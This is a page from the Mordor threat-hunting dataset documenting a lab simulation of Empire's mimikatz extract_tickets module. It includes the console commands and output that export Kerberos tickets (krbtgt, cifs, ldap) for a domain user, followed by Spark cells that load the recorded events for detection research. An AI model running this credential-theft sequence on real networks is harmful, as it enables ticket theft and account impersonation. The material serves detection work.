---
redirect_from:
  - "/notebooks/small/windows/06-credential-access/sd-190518230752"
interact_link: content/notebooks/small/windows/06_credential_access/SD-190518230752.ipynb
kernel_name: 
kernel_path: content/notebooks/small/windows/06_credential_access
has_widgets: false
title: |-
  Empire Mimikatz Extract Tickets
pagenum: 55
prev_page:
  url: /notebooks/small/windows/06_credential_access/SD-190319151006.html
next_page:
  url: /notebooks/small/windows/06_credential_access/SD-190625132210.html
suffix: .ipynb
search: com shire mimikatz name pm nmartha powershell x file empire credentials extracttickets aeshmac start end maxrenew am server client flags namecanonicalize preauthent renewable forwardable saved kirbi mordor tkvpx gentilkiwi extract tickets invoke dataset kerberos agent hfdc okasdelegate simulation description base module false true run tasked id windows hunters forge master powersploits function memory encoded form blog benjamin vincent krbtgt krbtgtshire e cifs ldap ldaphfdc metadata sd author roberto rodriguez cybrwardg creation date platform environment type c tool script github blacksmith blob aws cfn files scripts ps raw githubusercontent datasets small credentialaccess empiremimikatzextracttickets tar gz represents adversaries using adversary view usemodule

comment: "***PROGRAMMATICALLY GENERATED, DO NOT EDIT. SEE ORIGINAL FILES IN /content***"
---

    <main class="jupyter-page">
    <div id="page-info"><div id="page-title">Empire Mimikatz Extract Tickets</div>
</div>
    <div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Metadata">Metadata<a class="anchor-link" href="#Metadata"> </a></h2>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<table>
<thead><tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">id</td>
<td style="text-align:left">SD-190518230752</td>
</tr>
<tr>
<td style="text-align:left">author</td>
<td style="text-align:left">Roberto Rodriguez @Cyb3rWard0g</td>
</tr>
<tr>
<td style="text-align:left">creation date</td>
<td style="text-align:left">2019/05/18</td>
</tr>
<tr>
<td style="text-align:left">platform</td>
<td style="text-align:left">Windows</td>
</tr>
<tr>
<td style="text-align:left">Mordor Environment</td>
<td style="text-align:left">shire</td>
</tr>
<tr>
<td style="text-align:left">Simulation Type</td>
<td style="text-align:left">C2</td>
</tr>
<tr>
<td style="text-align:left">Simulation Tool</td>
<td style="text-align:left">Empire</td>
</tr>
<tr>
<td style="text-align:left">Simulation Script</td>
<td style="text-align:left"><a href="https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1">https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1</a></td>
</tr>
<tr>
<td style="text-align:left">Mordor Dataset</td>
<td style="text-align:left"><a href="https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_extract_tickets.tar.gz">https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_extract_tickets.tar.gz</a></td>
</tr>
</tbody>
</table>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Dataset-Description">Dataset Description<a class="anchor-link" href="#Dataset-Description"> </a></h2><p>This dataset represents adversaries using PowerSploit's Invoke-Mimikatz function to extract kerberos tickets from memory in base64-encoded form.</p>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Adversary-View">Adversary View<a class="anchor-link" href="#Adversary-View"> </a></h2>
<pre><code>(Empire: TKV35P8X) &gt; usemodule credentials/mimikatz/extract_tickets
(Empire: powershell/credentials/mimikatz/extract_tickets) &gt; info

              Name: Invoke-Mimikatz extract kerberos tickets.
            Module: powershell/credentials/mimikatz/extract_tickets
        NeedsAdmin: False
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to extract
  kerberos tickets from memory in base64-encoded form.

Comments:
  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        TKV35P8X                  Agent to run module on.                 

(Empire: powershell/credentials/mimikatz/extract_tickets) &gt; execute
[*] Tasked TKV35P8X to run TASK_CMD_JOB
[*] Agent TKV35P8X tasked with task ID 39
[*] Tasked agent TKV35P8X to run module powershell/credentials/mimikatz/extract_tickets
(Empire: powershell/credentials/mimikatz/extract_tickets) &gt; Job started: YG28AV
Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # standard::base64
isBase64InterceptInput  is false
isBase64InterceptOutput is false

mimikatz(powershell) # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 7:03:14 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : krbtgt/SHIRE.COM @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
  * Saved to file     : 0-60a10000-nmartha@krbtgt~SHIRE.COM-SHIRE.COM.kirbi

[00000001] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 6:23:33 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : krbtgt/SHIRE.COM @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
  * Saved to file     : 1-40e10000-nmartha@krbtgt~SHIRE.COM-SHIRE.COM.kirbi

[00000002] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 7:03:14 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : cifs/HFDC01.shire.com @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
  * Saved to file     : 2-40a50000-nmartha@cifs~HFDC01.shire.com-SHIRE.COM.kirbi

[00000003] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 6:54:14 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : ldap/HFDC01.shire.com/shire.com @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
  * Saved to file     : 3-40a50000-nmartha@ldap~HFDC01.shire.com~shire.com-SHIRE.COM.kirbi

[00000004] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 6:32:04 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : HOST/HFDC01 @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
  * Saved to file     : 4-40a50000-nmartha@HOST~HFDC01-SHIRE.COM.kirbi

[00000005] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 6:23:48 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : cifs/IT001 @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
  * Saved to file     : 5-40a10000-nmartha@cifs~IT001-SHIRE.COM.kirbi

[00000006] - 0x00000012 - aes256_hmac      
  Start/End/MaxRenew: 5/18/2019 6:23:33 PM ; 5/19/2019 4:23:33 AM ; 5/25/2019 6:23:33 PM
  Server Name       : ldap/HFDC01.shire.com @ SHIRE.COM
  Client Name       : nmartha @ SHIRE.COM
  Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
  * Saved to file     : 6-40a50000-nmartha@ldap~HFDC01.shire.com-SHIRE.COM.kirbi

(Empire: powershell/credentials/mimikatz/extract_tickets) &gt;</code></pre>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Explore-Mordor-Dataset">Explore Mordor Dataset<a class="anchor-link" href="#Explore-Mordor-Dataset"> </a></h2>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Initialize-Analytics-Engine">Initialize Analytics Engine<a class="anchor-link" href="#Initialize-Analytics-Engine"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">openhunt.mordorutils</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">spark</span> <span class="o">=</span> <span class="n">get_spark</span><span class="p">()</span>
</pre></div>

    </div>
</div>
</div>

</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Download-&amp;-Process-Mordor-File">Download &amp; Process Mordor File<a class="anchor-link" href="#Download-&amp;-Process-Mordor-File"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_extract_tickets.tar.gz&quot;</span>
<span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Get-to-know-your-data">Get to know your data<a class="anchor-link" href="#Get-to-know-your-data"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT channel, COUNT(1)</span>
<span class="sd">FROM mordorTable</span>
<span class="sd">GROUP BY channel</span>
<span class="sd">    &#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="kc">False</span><span class="p">)</span>
        
</pre></div>

    </div>
</div>
</div>

</div>
</div>

 


    </main>
    